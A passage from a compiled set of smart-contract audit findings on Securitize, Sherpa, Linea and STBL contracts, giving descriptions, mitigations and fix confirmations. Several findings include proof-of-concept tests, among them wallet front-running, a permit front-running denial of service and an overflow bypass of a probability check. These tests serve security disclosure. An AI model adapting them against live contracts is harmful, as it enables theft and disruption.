 function issueTokensCustom(address _to, uint256 _value, uint256 _issuanceTime, uint256 _valueLocked, string memory _reason, uint64 _releaseTime) // _to could be the wallet that malicious investor just take
    public
    virtual
    override
    returns (
    /*onlyIssuerOrAbove*/
        bool
    )
    {...}
```

**Proof of Concept:** Run the next proof of concept in `registry-service.test.ts` in describe `Wallet By Investor`

```typescript
 it('Steal wallet', async function() {
        // victim wallet will be another wallet that the investor2 want to register
        const [owner, investor1, investor2, victimWallet] = await hre.ethers.getSigners();
        const { registryService, dsToken } = await loadFixture(deployDSTokenRegulated);

        // Setup: Register two investors
        await registryService.registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1, INVESTORS.INVESTOR_ID.INVESTOR_COLLISION_HASH_1);
        await registryService.registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_2, INVESTORS.INVESTOR_ID.INVESTOR_COLLISION_HASH_2);

        // Setup: Add wallets to investors
        await registryService.addWallet(investor1, INVESTORS.INVESTOR_ID.INVESTOR_ID_1);
        await registryService.addWallet(investor2, INVESTORS.INVESTOR_ID.INVESTOR_ID_2);

        // Verify initial state
        expect(await registryService.getInvestor(investor1.address)).to.equal(INVESTORS.INVESTOR_ID.INVESTOR_ID_1);
        expect(await registryService.getInvestor(investor2.address)).to.equal(INVESTORS.INVESTOR_ID.INVESTOR_ID_2);
        expect(await registryService.isWallet(victimWallet.address)).to.be.false;

        // ATTACK: Investor1 front-runs and steals victimWallet before Investor2 can register it
        const registryServiceFromInvestor1 = await registryService.connect(investor1);
        await registryServiceFromInvestor1.addWalletByInvestor(victimWallet.address);

        // Verify attack succeeded - victimWallet now belongs to Investor1
        expect(await registryService.getInvestor(victimWallet.address)).to.equal(INVESTORS.INVESTOR_ID.INVESTOR_ID_1);
        expect(await registryService.isWallet(victimWallet.address)).to.be.true;

        // Now if Investor2 tries to register the same wallet, it will fail
        const registryServiceFromInvestor2 = await registryService.connect(investor2);
        await expect(
          registryServiceFromInvestor2.addWalletByInvestor(victimWallet.address)
        ).to.be.revertedWith("Wallet already exists");

        // Demonstrate token hijacking - issue tokens to victimWallet
        // The tokens will go to Investor1 instead of Investor2
        await dsToken.setCap(1000);
        await dsToken.issueTokens(victimWallet.address, 100);

        // Verify Investor1 received the tokens (through their wallet)
        expect(await dsToken.balanceOf(victimWallet.address)).to.equal(100);
        expect(await registryService.getInvestor(victimWallet.address)).to.equal(INVESTORS.INVESTOR_ID.INVESTOR_ID_1);

      });
```

**Recommended Mitigation:** Remove `addWalletByInvestor`.

**Securitize:** Fixed in commit [05c5bad](https://github.com/securitize-io/dstoken/commit/05c5bada3c2801b1333fc96f4abc5226a84471f0).

**Cyfrin:** Verified.

## [M-81] Multiplication could overflow in `RebasingLibrary` for tokens with greater than 18 decimals
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** `RebasingLibrary` contains special handling for tokens with greater than 18 decimals:
```solidity
// convertTokensToShares
        } else {
            uint256 scale = 10**(_tokenDecimals - 18);
            return (_tokens * DECIMALS_FACTOR + (_rebasingMultiplier * scale) / 2) / (_rebasingMultiplier * scale);
        }

// convertSharesToTokens
        } else {
            uint256 scale = 10**(_tokenDecimals - 18);
            return (_shares * _rebasingMultiplier * scale + DECIMALS_FACTOR / 2) / DECIMALS_FACTOR;
        }
```

**Impact:** When using tokens with high decimal values, the multiplication here could overflow causing denial of service.

**Recommended Mitigation:** Use OpenZeppelin's [Math::mulDiv](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol#L204), fixed code also incorporates suggested fix for L-1:
```solidity
pragma solidity 0.8.22;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

library RebasingLibrary {
    uint256 private constant DECIMALS_FACTOR = 1e18;

    function convertTokensToShares(
        uint256 _tokens,
        uint256 _rebasingMultiplier,
        uint8 _tokenDecimals
    ) internal pure returns (uint256 shares) {
        require(_rebasingMultiplier > 0, "Invalid rebasing multiplier");

        if (_tokenDecimals == 18) {
            return Math.mulDiv(_tokens, DECIMALS_FACTOR, _rebasingMultiplier);
        } else if (_tokenDecimals < 18) {
            uint256 scale = 10**(18 - _tokenDecimals);
            // tokens * scale * DECIMALS_FACTOR / multiplier
            return Math.mulDiv(_tokens * scale, DECIMALS_FACTOR, _rebasingMultiplier);
        } else {
            uint256 scale = 10**(_tokenDecimals - 18);
            // tokens * DECIMALS_FACTOR / (multiplier * scale)
            return Math.mulDiv(_tokens, DECIMALS_FACTOR, _rebasingMultiplier * scale);
        }
    }

    function convertSharesToTokens(
        uint256 _shares,
        uint256 _rebasingMultiplier,
        uint8 _tokenDecimals
    ) internal pure returns (uint256 tokens) {
        require(_rebasingMultiplier > 0, "Invalid rebasing multiplier");

        if (_tokenDecimals == 18) {
            return Math.mulDiv(_shares, _rebasingMultiplier, DECIMALS_FACTOR);
        } else if (_tokenDecimals < 18) {
            uint256 scale = 10**(18 - _tokenDecimals);
            // (shares * multiplier / DECIMALS_FACTOR) / scale
            return Math.mulDiv(_shares, _rebasingMultiplier, DECIMALS_FACTOR * scale);
        } else {
            uint256 scale = 10**(_tokenDecimals - 18);
            // shares * multiplier * scale / DECIMALS_FACTOR
            return Math.mulDiv(_shares * scale, _rebasingMultiplier, DECIMALS_FACTOR);
        }
    }
}
```

**Securitize:** Fixed in commit [9b81e76](https://github.com/securitize-io/dstoken/commit/9b81e76c6d75f8e550f719a27c344cb337377d79) by reverting for tokens with greater than 18 decimals.

**Cyfrin:** Verified.

## [M-82] No way to revert `setInvestorLiquidateOnly`
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** The `setInvestorLiquidateOnly` function in `InvestorLockManagerBase.sol` contains a logic error that prevents the disabling of liquidate-only mode once it has been enabled. The function includes a require statement that checks if the investor is already in liquidate-only mode and reverts if they are, making it impossible to toggle the state back to false.

``` solidity
function setInvestorLiquidateOnly(string memory _investorId, bool _enabled) public onlyTransferAgentOrAbove returns (bool) {
    require(!investorsLiquidateOnly[_investorId], "Investor is already in liquidate only mode");
    investorsLiquidateOnly[_investorId] = _enabled;
    emit InvestorLiquidateOnlySet(_investorId, _enabled);
    return true;
}
```

**Impact:** Once an investor is set to liquidate-only mode, there is no way to disable this state


**Recommended Mitigation:** Remove the require statement to allow toggling of the liquidate-only state:

```diff
function setInvestorLiquidateOnly(string memory _investorId, bool _enabled) public onlyTransferAgentOrAbove returns (bool) {
-   require(!investorsLiquidateOnly[_investorId], "Investor is already in liquidate only mode");
    investorsLiquidateOnly[_investorId] = _enabled;
    emit InvestorLiquidateOnlySet(_investorId, _enabled);
    return true;
}
```

**Securitize:** Fixed in commit [74a6675](https://github.com/securitize-io/dstoken/commit/74a66753c15a2cdddc41a29ae8d736711b141939) by reverting if the current state is the same as the input state; this allows state to be toggled on/off.

**Cyfrin:** Verified.

## [M-83] `StandardToken::transferWithPermit` can be DoS attacked by front-running to directly call `ERC20PermitMixin::permit`
- Severity: `Medium`
- Source report: `registry.md`

### Detailed Content (from source)
**Description:** `StandardToken::transferWithPermit` contains two calls:
* first to `ERC20PermitMixin::permit`
* second to the `StandardToken::transferFrom`

**Impact:** Since the permit signature and parameters are visible in the mempool before execution, an attacker can extract these values and front-run the transaction by directly calling `StandardToken::permit`. This consumes the user's nonce causing the original call `StandardToken::transferWithPermit` to revert, making it impossible to atomically grant the approval and transfer the tokens.

**Proof of concept**
Run the PoC in `dstoken-regulated.test.ts` inside the `describe('Permit transfer', async function () {`:
```typescript
it('front-running attack on transferWithPermit()', async () => {
        const [owner, spender, recipient, attacker] = await hre.ethers.getSigners();
        const { dsToken, registryService } = await loadFixture(deployDSTokenRegulated);
        const value = 100;
        const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);

        // Owner creates a signature to allow spender to transfer tokens to recipient
        const message = {
          owner: owner.address,
          spender: spender.address,
          value,
          nonce: await dsToken.nonces(owner.address),
          deadline,
        };
        const { v, r, s } = await buildPermitSignature(owner, message, await dsToken.name(), await dsToken.getAddress());

        // Register investors and issue tokens to owner; see that the attacker is not even an ibnvestor so it could be any address
        await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1, owner, registryService);
        await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_2, recipient, registryService);

        await dsToken.issueTokens(owner, value);

        // ATTACK SCENARIO 1: Attacker front-runs by calling permit() directly
        await dsToken.connect(attacker).permit(owner.address, spender.address, value, deadline, v, r, s);


        // When the original transferWithPermit() executes, it FAILS
        // because the nonce has already been used
        await expect(
          dsToken.connect(spender).transferWithPermit(owner.address, recipient.address, value, deadline, v, r, s)
        ).to.be.revertedWith('Permit: invalid signature');
      });
```

**Recommended Mitigation:** Use the try and catch pattern:
```solidity
function transferWithPermit(
    address from,
    address to,
    uint256 value,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s
) external returns (bool) {
    // Try to execute permit, but don't revert if it fails
    try this.permit(from, msg.sender, value, deadline, v, r, s) {
        // Permit succeeded
    } catch {
        // Permit failed (possibly due to front-running or already executed)
        // Verify we have sufficient allowance to proceed
        require(allowance(from, msg.sender) >= value, "Insufficient allowance");
    }

    // Perform the actual transferFrom
    return transferFrom(from, to, value);
}
```

**Securitize:** Fixed in commit [d7cf385](https://github.com/securitize-io/dstoken/commit/d7cf3858c371def66e5b37ed0949aa991d0a0234).

**Cyfrin:** Verified.

## [M-84] Same wallet can be added multiple times to an investor, artificially increasing their wallet count causing adding new wallets to revert
- Severity: `Medium`
- Source report: `registry.md`

### Detailed Content (from source)
**Description:** `GlobalRegistryService::_updateInvestor` calls `_addWallet` when the wallet being added is already registered to this investor:
```solidity
for (uint8 i = 0; i < walletAddresses.length; i++) {
    // @audit if it is a wallet and it doesn't belong to this investor, revert
    if (isWallet(walletAddresses[i]) && !CommonUtils.isEqualString(getInvestor(walletAddresses[i]), id)) {
        revert WalletBelongsToAnotherInvestor();
    }
    // @audit otherwise add it - even if it is a wallet that already belongs to this investor!
    else {
        _addWallet(walletAddresses[i], id);
    }
}
```

`GlobalRegistryService::_addWallet` in turn increments the investor's `walletCount` and reverts once the max are reached:
```solidity
function _addWallet(address walletAddress, string memory id) internal addressNotZero(walletAddress) returns (bool) {
    if (investors[id].walletCount >= MAX_WALLETS_PER_INVESTOR) {
        revert MaxWalletsReached();
    }
    address sender = _msgSender();
    investorsWallets[walletAddress] = Wallet(id, sender);
    investors[id].walletCount++;

    emit GlobalWalletAdded(walletAddress, id, sender);

    return true;
}
```

**Impact:** An investor's wallet count can be artificially inflated when updating that investor's details especially via `GlobalRegistryService::updateInvestor` which can be called with all of an investor's existing data and only some modified fields. Once `MAX_WALLETS_PER_INVESTOR` is reached no further updates are possible.

There are also other impacts such as never being able to remove an investor since `GlobalRegistryService::removeWallet` won't be able to decrement the investor's `walletCount` back to 0 hence `removeInvestor` will always revert.

**Proof Of Concept:**
First add this `view` function to `GlobalRegistryService.sol`:
```solidity
    function walletCountByInvestor(string calldata investorId) public view returns (uint256) {
        return investors[investorId].walletCount;
    }
```

Then add the PoC to `global-registry-service.tests.ts`:
```typescript
  it('Bug - adding same wallet for same investor inflates wallet count', async function () {
    const [, investor] = await hre.ethers.getSigners();
    const { globalRegistryService } = await loadFixture(deployGRS);
    await globalRegistryService.updateInvestor(
      INVESTORS.INVESTOR_ID.INVESTOR_ID_1,
      INVESTORS.INVESTOR_ID.INVESTOR_COLLISION_HASH_1,
      US,
      [investor],
      [1, 2, 4],
      [1, 1, 1],
      [0, 0, 0],
    );

    await globalRegistryService.updateInvestor(
      INVESTORS.INVESTOR_ID.INVESTOR_ID_1,
      INVESTORS.INVESTOR_ID.INVESTOR_COLLISION_HASH_1,
      US,
      [investor],
      [1, 2, 4],
      [1, 1, 1],
      [0, 0, 0],
    );

    expect(await globalRegistryService.walletCountByInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1)).to.equal(2);

  });
```

Run with `npx hardhat test --grep "adding same wallet for same investor inflates wallet count"`.

**Recommended Mitigation:** In `GlobalRegistryService::_updateInvestor` if the wallet being added is a wallet and already belongs to the same investor, don't do anything. Here is a more efficient implementation of `_updateInvestor` that avoids duplicate work done by the `isWallet` and `isInvestor` functions while also fixing this bug:
```solidity
function _updateInvestor(string calldata id, address[] memory walletAddresses) internal returns (bool) {
    // revert if max wallet would be breached
    uint256 walletAddressesLen = walletAddresses.length;
    if (walletAddressesLen > MAX_WALLETS_PER_INVESTOR) {
        revert TooManyWallets();
    }

    // register investor if they don't already exist
    if (!isInvestor(id)) {
        _registerInvestor(id);
    }

    for (uint8 i; i < walletAddressesLen; i++) {
        address newWallet = walletAddresses[i];

        // is the wallet already registered to an investor?
        string memory walletExistingInvestor = getInvestor(newWallet);

        // if not then add it
        if(!isInvestor(walletExistingInvestor)) {
            _addWallet(newWallet, id);
        }
        // otherwise revert if it is registered to another investor
        else if(!CommonUtils.isEqualString(walletExistingInvestor, id)) {
            revert WalletBelongsToAnotherInvestor();
        }
        // if it is already registered to this investor, do nothing
    }

    return true;
}
```

**Securitize:** Fixed in commit [5713fd2](https://github.com/securitize-io/bc-global-registry-service-sc/commit/5713fd25851f6a437b45d947f5d4652f2450fb10).

**Cyfrin:** Verified.

## [M-85] `setApprovalForAll()` function is double initialized in the child contract
- Severity: `Medium`
- Source report: `rwasegwrap.md`

### Detailed Content (from source)
**Description:** At the moment, there is a double function initialization of the ERC1155 `setApprovalForAll()` function both in the parent `RWASegWrap` and the child `SecuritizeRWASegWrap` contracts:

```
    // @inheritdoc IERC1155
    function setApprovalForAll(address, bool) public virtual pure override {
        revert FeatureNotSupported();
    }

```


```
    // @inheritdoc IERC1155
    function setApprovalForAll(address, bool) public virtual pure override {
        revert FeatureNotSupported();
    }
```

**Impact:** Increased deployment costs.

**Recommended Mitigation:** Remove `setApprovalForAll()` implementation from the  `SecuritizeRWASegWrap`.

**Securitize**
Fixed in commit [b78f30](https://github.com/securitize-io/bc-rwa-seg-wrap-sc/commit/b78f305a0dcc6a1e7eb425d05bae150f23d2d184).

**Cyfrin:** Verified.

## [M-86] Code duplication in function overrides that only add modifiers
- Severity: `Medium`
- Source report: `rwasegwrap.md`

### Detailed Content (from source)
**Description:** The `SecuritizeRWASegWrap` contract overrides four functions from its parent `RWASegWrap` contract (`deposit`, `redeem`, `redeemById`, and `depositById`) with identical implementation logic, only adding the `receiverIsSender` modifier. Instead of duplicating the entire function body, these functions should call their parent implementations using `super` after applying the additional modifier.

The current implementations in `SecuritizeRWASegWrap::deposit`, `SecuritizeRWASegWrap::redeem`, `SecuritizeRWASegWrap::redeemById`, and `SecuritizeRWASegWrap::depositById` repeat the exact same business logic as their parent functions in `RWASegWrap`, including variable declarations, vault resolution, validation checks, and internal function calls.

```solidity
// Current implementation in SecuritizeRWASegWrap
function deposit(uint256 assets, address receiver)
    public override whenNotPaused amountNotZero(assets) addressNotZero(receiver) receiverIsSender(receiver)
    returns (uint256) {
    address caller = _msgSender();
    uint256 vaultId = getVaultId(caller);
    if (vaultId == 0) {
        vaultId = ++latestVaultId;
        vault = _deployVault(vaultId);
        _addVault(address(vault), vaultId, caller);
    }
    return _doDeposit(caller, assets, receiver, vaultId);
}

// Parent implementation in RWASegWrap (identical logic except missing receiverIsSender modifier)
function deposit(uint256 assets, address receiver)
    external virtual override whenNotPaused amountNotZero(assets) addressNotZero(receiver)
    returns (uint256) {
    address caller = _msgSender();
    uint256 vaultId = _resolveVaultId(caller);
    return _doDeposit(caller, assets, receiver, vaultId);
}
```

**Impact:** This code duplication increases the maintenance burden while creating a risk of inconsistencies.

**Recommended Mitigation:** Refactor the overridden functions to use `super` calls instead of duplicating logic:

```diff
function deposit(uint256 assets, address receiver)
    public override whenNotPaused amountNotZero(assets) addressNotZero(receiver) receiverIsSender(receiver)
    returns (uint256) {
-   address caller = _msgSender();
-   uint256 vaultId = getVaultId(caller);
-   if (vaultId == 0) {
-       vaultId = ++latestVaultId;
-       vault = _deployVault(vaultId);
-       _addVault(address(vault), vaultId, caller);
-   }
-   return _doDeposit(caller, assets, receiver, vaultId);
+   return super.deposit(assets, receiver);
}

function redeem(uint256 shares, address receiver, address owner)
    external override whenNotPaused amountNotZero(shares) addressNotZero(receiver) receiverIsSender(receiver) addressNotZero(owner)
    returns (uint256) {
-   address caller = _msgSender();
-   uint256 vaultId = getVaultId(caller);
-   if (vaultId == 0) {
-       revert VaultNotFound();
-   }
-   return _doRedeem(caller, shares, receiver, owner, vaultId);
+   return super.redeem(shares, receiver, owner);
}

function redeemById(uint256 shares, address receiver, address owner, uint256 id)
    external override whenNotPaused amountNotZero(shares) addressNotZero(receiver) addressNotZero(owner) receiverIsSender(receiver) idNotZero(id) recognizedVault(id)
    returns (uint256) {
-   address caller = _msgSender();
-   uint256 vaultId = getVaultId(caller);
-   if (id != vaultId) {
-       revert InvestorVaultMismatch(id, caller);
-   }
-   return _doRedeem(caller, shares, receiver, owner, id);
+   return super.redeemById(shares, receiver, owner, id);
}

function depositById(uint256 assets, address receiver, uint256 id)
    external override whenNotPaused amountNotZero(assets) receiverIsSender(receiver) idNotZero(id) recognizedVault(id)
    returns (uint256) {
-   address caller = _msgSender();
-   uint256 vaultId = getVaultId(caller);
-   if (id != vaultId) {
-       revert InvestorVaultMismatch(id, caller);
-   }
-   return _doDeposit(caller, assets, receiver, vaultId);
+   return super.depositById(assets, receiver, id);
}
```

**Securitize:** Fixed in commit [6322e3](https://github.com/securitize-io/bc-rwa-seg-wrap-sc/commit/6322e36c86c012123db32e3dcd6cfe9ebd99eed4).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization

## [M-87] Incorrect allowance check in transfer functions prevents users from transferring their own tokens
- Severity: `Medium`
- Source report: `rwasegwrap.md`

### Detailed Content (from source)
**Description:** The protocol implements transfer functions in both `RWASegWrap` and `SecuritizeRWASegWrap` contracts that violate standard token transfer practices by always checking allowance, even when users are transferring their own tokens.

In `RWASegWrap::safeTransferFrom()`, lines 448-450 always check the allowance:
```solidity
uint256 currentAllowance = allowance(from, _msgSender(), id);
if (currentAllowance < value) {
    revert ERC1155MissingApprovalForAll(_msgSender(), from);
}
```

Similarly, `RWASegWrap::transferFrom()` calls `ISegregatedVault(vaults[id]).internalTransferFrom(from, to, _msgSender(), value)` which internally calls `_spendAllowance(from, spender, value)` where the spender is `_msgSender()`, forcing an allowance check even for self-transfers.

According to standard token implementation practices, allowance checks should only occur when the sender is not the token owner. The correct behavior is demonstrated in OpenZeppelin's implementation, where approval is only checked when `from != sender`:

```solidity
// OpenZeppelin's ERC1155Upgradeable
address sender = _msgSender();
if (from != sender && !isApprovedForAll(from, sender)) {
    revert ERC1155MissingApprovalForAll(sender, from);
}
```

`SecuritizeRWASegWrap` inherits from `RWASegWrap` and therefore has the same non-compliant behavior for both transfer functions.

**Impact:** Users cannot transfer their own tokens without first calling approve to grant themselves allowance, creating unnecessary friction and violating standard token transfer expectations.

**Recommended Mitigation:** Modify the allowance check to only occur when the sender is not the token owner, following standard token implementation practices:

```diff
function safeTransferFrom(
    address from,
    address to,
    uint256 id,
    uint256 value,
    bytes memory data
) public virtual override whenNotPaused idNotZero(id) recognizedVault(id) {
    if (to == address(0)) {
        revert ERC1155InvalidReceiver(address(0));
    }
    if (from == address(0)) {
        revert ERC1155InvalidSender(address(0));
    }
    uint256 vaultId = getVaultId(from);
    if (id != vaultId) {
        revert InvestorVaultMismatch(id, from);
    }

-   uint256 currentAllowance = allowance(from, _msgSender(), id);
-   if (currentAllowance < value) {
-       revert ERC1155MissingApprovalForAll(_msgSender(), from);
-   }
+   address sender = _msgSender();
+   if (from != sender) {
+       uint256 currentAllowance = allowance(from, sender, id);
+       if (currentAllowance < value) {
+           revert ERC1155MissingApprovalForAll(sender, from);
+       }
+   }

    uint256 currentBalance = balanceOf(from, id);
    if (currentBalance < value) {
        revert ERC1155InsufficientBalance(from, currentBalance, value, id);
    }

    emit TransferSingle(_msgSender(), from, to, id, value);
    ISegregatedVault(vaults[id]).internalTransferFrom(from, to, _msgSender(), value);
    ERC1155Utils.checkOnERC1155Received(_msgSender(), from, to, id, value, data);
}
```

The `internalTransferFrom` function should also be updated to conditionally call `_spendAllowance` only when `from != spender`.

**Securitize:** Fixed in commits [dd0035](https://github.com/securitize-io/bc-securitize-vault-sc/commit/dd0035fa0e700650b948191a70e7d6f9931a828e) and [4f0722](https://github.com/securitize-io/bc-rwa-seg-wrap-sc/commit/4f07223535989cc4fe99cfb22648a98addc61539).

**Cyfrin:** Verified.

## [M-88] Missing `notEmptyURI` modifier during initialization
- Severity: `Medium`
- Source report: `rwasegwrap.md`

### Detailed Content (from source)
**Description:** Currently, there is no `notEmptyURI` modifier present in the `initialize()` function that checks for the empty URI and, if it's empty, reverts the transaction:

```
//RWASegWrap.sol#L98-103
    modifier notEmptyUri(string memory newUri) {
        if (bytes(newUri).length == 0) {
            revert EmptyUriInvalid();
        }
        _;
    }
```

```
//RWASegWrap.sol#L131-147
   function initialize(
        string memory baseNameArg,
        string memory baseSymbolArg,
        string memory uriArg,
        address liquidationAssetArg,
        address assetArg,
        address vaultDeployerArg
    )
    public
    virtual
    override
    onlyProxy
    initializer
    addressNotZero(liquidationAssetArg)
    addressNotZero(assetArg)
    addressNotZero(vaultDeployerArg)
    {

```


**Impact:** Insufficient validation, `projectURI` may not be set during the initialization process.

**Recommended Mitigation:** Add the `notEmptyUri` modifier that checks for the empty URI.

**Securitize**
Fixed in commit [0946fb](https://github.com/securitize-io/bc-securitize-vault-sc/commit/0946fbac2f4dd161c31c2cc8125c1203d6b46590).

**Cyfrin:** Verified.

\clearpage

## [M-89] Redundant balance check in safeTransferFrom before calling underlying transfer function
- Severity: `Medium`
- Source report: `rwasegwrap.md`

### Detailed Content (from source)
**Description:** The `RWASegWrap::safeTransferFrom()` function performs an unnecessary balance check on lines 452-454 before calling the underlying transfer function:

```solidity
uint256 currentBalance = balanceOf(from, id);
if (currentBalance < value) {
    revert ERC1155InsufficientBalance(from, currentBalance, value, id);
}
```

This balance check is redundant because the subsequent call to `ISegregatedVault(vaults[id]).internalTransferFrom(from, to, _msgSender(), value)` internally calls the ERC20 `_transfer()` function, which already performs the same balance validation. The ERC20 `_update()` function (which `_transfer()` calls) contains the exact same check:

```solidity
uint256 fromBalance = $._balances[from];
if (fromBalance < value) {
    revert ERC20InsufficientBalance(from, fromBalance, value);
}
```

When the balance is insufficient, the ERC20 mechanism will automatically revert with `ERC20InsufficientBalance`, making the wrapper-level balance check redundant.

**Impact:** The redundant balance check results in unnecessary gas consumption and code complexity without providing additional safety.

**Recommended Mitigation:** Remove the redundant balance check:

```diff
function safeTransferFrom(
    address from,
    address to,
    uint256 id,
    uint256 value,
    bytes memory data
) public virtual override whenNotPaused idNotZero(id) recognizedVault(id) {
    if (to == address(0)) {
        revert ERC1155InvalidReceiver(address(0));
    }
    if (from == address(0)) {
        revert ERC1155InvalidSender(address(0));
    }
    uint256 vaultId = getVaultId(from);
    if (id != vaultId) {
        revert InvestorVaultMismatch(id, from);
    }

    uint256 currentAllowance = allowance(from, _msgSender(), id);
    if (currentAllowance < value) {
        revert ERC1155MissingApprovalForAll(_msgSender(), from);
    }

-   uint256 currentBalance = balanceOf(from, id);
-   if (currentBalance < value) {
-       revert ERC1155InsufficientBalance(from, currentBalance, value, id);
-   }

    emit TransferSingle(_msgSender(), from, to, id, value);
    ISegregatedVault(vaults[id]).internalTransferFrom(from, to, _msgSender(), value);
    ERC1155Utils.checkOnERC1155Received(_msgSender(), from, to, id, value, data);
}
```

**Securitize:** Fixed in commit [13955e](https://github.com/securitize-io/bc-rwa-seg-wrap-sc/commit/13955e2b094b19d8bfb71020498c4607c127627f).

**Cyfrin:** Verified.

## [M-90] Optimize setters by emitting event before state updates
- Severity: `Medium`
- Source report: `sherpa.md`

### Detailed Content (from source)
**Description:** Functions `SherpaUSD::setKeeper`, `SherpaUSD::setOperator`, `SherpaUSD::setAutoTransfer` and `SherpaVault::setDepositsEnabled`, `SherpaVault::setStableWrapper` create an unnecessary memory variable to store old values used for event emissions. However, this is not required if the event is emitted first.

For example, function setKeeper can be optimized in the following manner:

```solidity
function setKeeper(address _keeper) external onlyOwner {
    if (_keeper == address(0)) revert AddressMustBeNonZero();
    emit KeeperSet(keeper, _keeper);
    keeper = _keeper;
}
```

**Recommended Mitigation:** Consider removing the memory variables by emitting events first.

**Sherpa:** Fixed in commit [`7e34a6b`](https://github.com/hedgemonyxyz/sherpa-vault-smartcontracts/commit/7e34a6b064b63d8f7a3f2c66c49e10adab0198b7)

**Cyfrin:** Verified.

\clearpage

## [M-91] Probability overflow can bypass `MaxProbabilityExceeded` check
- Severity: `Medium`
- Source report: `spingame.md`

### Detailed Content (from source)
**Description:** When adding new prizes, the contract includes a check to ensure that the total probability does not exceed 100% in [`Spin::_addPrizes#L511-L513`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L511-L513):

```solidity
if (totalProbabilities > BASE_POINT) {
    revert MaxProbabilityExceeded(totalProbabilities);
}
```

However, this check can be bypassed due to how `totalProbabilities` is calculated. The accumulation of probabilities happens in `unchecked` blocks at the following locations:

- First accumulation of individual probability values, [`Spin::_addPrizes#L503-L505`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L503-L505):

  ```solidity
  unchecked {
      totalProbIncrease += probability;
  }
  ```

- Final update of `totalProbabilities`, [`Spin::_addPrizes#L508-L510`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L508-L510):

  ```solidity
  unchecked {
      totalProbabilities += totalProbIncrease;
  }
  ```

Because both updates occur within `unchecked` blocks, a very large probability value can overflow, effectively bypassing the `MaxProbabilityExceeded` check. This could allow `totalProbabilities` to wrap around and appear valid, even if it exceeds `BASE_POINT`.

**Impact:** Although this function can only be called by trusted users (e.g., the `CONTROLLER` or `DEFAULT_ADMIN` role), a mistake or a compromised account could still trigger this issue by adding an excessively large probability value. This would cause an overflow, allowing the ``MaxProbabilityExceeded check to be bypassed and potentially breaking the integrity of the game by distorting the prize distribution.

**Proof of Concept:** Add the following test to `Spin.t.sol`:
```solidity
function testUpdateWithMoreThanMaxProba() external {
    MockERC721 nft = new MockERC721("Test NFT", "TNFT");
    nft.mint(address(spinGame), 10);
    nft.mint(address(spinGame), 21);

    ISpinGame.Prize[] memory prizesToUpdate = new ISpinGame.Prize[](2);
    uint256[] memory empty = new uint256[](0);

    uint256[] memory nftAvailable = new uint256[](2);
    nftAvailable[0] = 10;
    nftAvailable[1] = 21;

    prizesToUpdate[0] = ISpinGame.Prize({
        tokenAddress: address(nft),
        amount: 0,
        lotAmount: 2,
        probability: type(uint64).max - 1,
        availableERC721Ids: nftAvailable
    });

    prizesToUpdate[1] = ISpinGame.Prize({
        tokenAddress: address(0),
        amount: 1e18,
        lotAmount: 2,
        probability: 2,
        availableERC721Ids: empty
    });

    vm.prank(admin);
    spinGame.updatePrizes(prizesToUpdate);

    assertEq(spinGame.getPrize(1).probability, type(uint64).max - 1);
}
```

**Recommended Mitigation:** Consider removing the `unchecked` blocks in both calculations.

**Linea:** Fixed in commit [`e840e2f`](https://github.com/Consensys/linea-hub/commit/e840e2f04dca6006ac7b5782765c58e7a6869603)

**Cyfrin:** Verified.

\clearpage

## [M-92] Insufficient fee validation in `STBL_Register::setupAsset` can cause underflow
- Severity: `Medium`
- Source report: `stbl.md`

### Detailed Content (from source)
**Description:** The `STBL_Register::setupAsset` and `STBL_Register::setFees` functions validate individual fees but ignore their cumulative impact. Consider the following logic in `STBL_MetadataLib.calculateDepositFees` where the `depositfeeAmount`, `haircutAmount` and `insurancefeeAmount` are calculated on the gross stable value:

```solidity
function calculateDepositFees(YLD_Metadata memory data) internal pure returns (YLD_Metadata memory) {
    // All deposit-time fees calculated on same base (stableValueGross)
    data.depositfeeAmount = (data.stableValueGross * data.Fees.depositFee) / 10000;
    data.haircutAmount = (data.stableValueGross * data.Fees.hairCut) / 10000;
    data.insurancefeeAmount = (data.stableValueGross * data.Fees.insuranceFee) / 10000;
    data.withdrawfeeAmount = (data.stableValueGross * data.Fees.withdrawFee) / 10000;
    return data; //@audit depositfeeAmount, haircutAmount and insurancefeeAmount are calculated on stableValueGross
}
```

Both the `STBL_LT1_Issuer` and `STBL_PT1_Issuer` contracts calculate the net stable value as follows:

```solidity
   MetaData.stableValueNet = (MetaData.stableValueGross -
            (MetaData.depositfeeAmount +
                MetaData.haircutAmount +
                MetaData.insurancefeeAmount));
```

This would mean that if the sum of all fees in basis points exceeds 10000, the metadata logic will always revert when computing the net stable value.


**Impact:** A combination of fees where the sum of deposit fee, hair cut and insurance fee exceeds 10000 can cause underflow in net stable value calculation.


**Recommended Mitigation:** Consider introducing a cumulative check in the  `STBL_Register::setupAsset` and `STBL_Register::setFees` functions.

**STBL:** Fixed in commit [1adc1f2](https://github.com/USD-Pi-Protocol/contract/commit/1adc1f2d05dcbcee89826ab9b7d625642c0834bd)

**Cyfrin:** Verified.

## [M-93] Unnecessary usage of `_msgSender()` to validate if caller is the `Issuer` on the `STBL_PT1_YieldDistributor`
- Severity: `Medium`
- Source report: `stbl.md`

### Detailed Content (from source)
**Description:** On the `STBL_PT1_YieldDistributor` contract, the functions `enableStaking()` and `disableStaking()` use the modifier `isIssuer()` to validate if the caller is the authorized issuer of the `assetId` configured for the YieldDistributor.

`STBL_PT1_YieldDistributor.isIssuer()` calls the internal `_msgSender()` which calls `ERC2771ContextUpgradeable._msgSender()` and eventually will call `ContextUpgradeable._msgSender()`.

